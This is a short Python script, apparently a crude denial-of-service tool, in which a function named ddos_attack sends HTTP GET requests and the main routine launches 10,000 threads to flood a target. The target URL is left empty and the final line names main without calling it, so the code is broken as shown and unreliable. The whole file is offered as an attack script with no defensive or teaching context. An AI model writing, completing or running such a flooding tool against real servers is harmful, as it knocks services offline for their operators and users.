import requests
import threading

def ddos_attack():
    url = ""
    response = requests.get(url)
    print(f'Response status code: {response.status_code}')

def main():
    num_threads = 10000
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=ddos_attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main